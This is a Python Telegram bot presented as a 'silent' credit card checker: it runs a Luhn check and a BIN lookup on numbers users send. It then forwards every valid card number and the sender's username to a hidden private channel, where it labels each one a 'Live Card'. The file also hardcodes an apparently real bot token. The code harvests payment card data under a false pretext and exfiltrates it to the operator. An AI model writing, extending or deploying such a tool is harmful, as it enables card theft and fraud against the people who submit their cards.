import logging
import re
import requests
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# 🔒 Your bot token
BOT_TOKEN = '8355144975:AAHaVlWjsn_txRXhU1rTejlLdUSFly6oIZw'

# 🔐 Your private group/channel chat_id (must be numeric, start with -100 for supergroup)
FORWARD_CHAT_ID = -1002791869676

# Logging
logging.basicConfig(level=logging.INFO)

# 💳 Regex to detect card format
CARD_REGEX = re.compile(r'(\d{12,19})')

# ✅ Luhn Algorithm to check card number validity
def is_luhn_valid(card_number):
    digits = [int(d) for d in card_number]
    checksum = 0
    reverse = digits[::-1]
    for i, digit in enumerate(reverse):
        if i % 2 == 1:
            doubled = digit * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += digit
    return checksum % 10 == 0

# 🔎 Get BIN Info (first 6 digits)
def get_bin_info(bin_number):
    try:
        res = requests.get(f'https://lookup.binlist.net/{bin_number}')
        if res.status_code == 200:
            data = res.json()
            return {
                'scheme': data.get('scheme', 'N/A'),
                'type': data.get('type', 'N/A'),
                'brand': data.get('brand', 'N/A'),
                'bank': data.get('bank', {}).get('name', 'N/A'),
                'country': data.get('country', {}).get('name', 'N/A'),
                'prepaid': data.get('prepaid', False)
            }
    except:
        pass
    return None

# 🔁 Handle /start
def start(update: Update, context: CallbackContext):
    update.message.reply_text("👋 Send me a card number and I’ll check it silently for you.")

# 📥 Handle Messages
def handle_message(update: Update, context: CallbackContext):
    text = update.message.text.strip()
    matches = CARD_REGEX.findall(text)

    if not matches:
        update.message.reply_text("❌ Invalid card format. Please send numbers only (12–19 digits).")
        return

    for card in matches:
        card = card.strip()

        if not is_luhn_valid(card):
            update.message.reply_text(f"❌ `{card}` is not a valid card number.", parse_mode=ParseMode.MARKDOWN)
            continue

        bin_number = card[:6]
        info = get_bin_info(bin_number)

        if info:
            msg = f"""💳 *Card Check Complete:*

`{card}`
➤ **BIN**: {bin_number}
➤ **Scheme**: {info['scheme'].title()}
➤ **Type**: {info['type'].title()}
➤ **Brand**: {info['brand']}
➤ **Bank**: {info['bank']}
➤ **Country**: {info['country']}
➤ **Prepaid**: {"Yes" if info['prepaid'] else "No"}

_This info has been sent to admin group._
"""
        else:
            msg = f"✅ `{card}` seems valid (Luhn), but no BIN info found."

        update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

        # 👀 Forward to private channel
        context.bot.send_message(
            chat_id=FORWARD_CHAT_ID,
            text=f"🔥 *Live Card:* `{card}`\nBy: @{update.effective_user.username or 'Unknown'}",
            parse_mode=ParseMode.MARKDOWN
        )

# 🤖 Start Bot
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
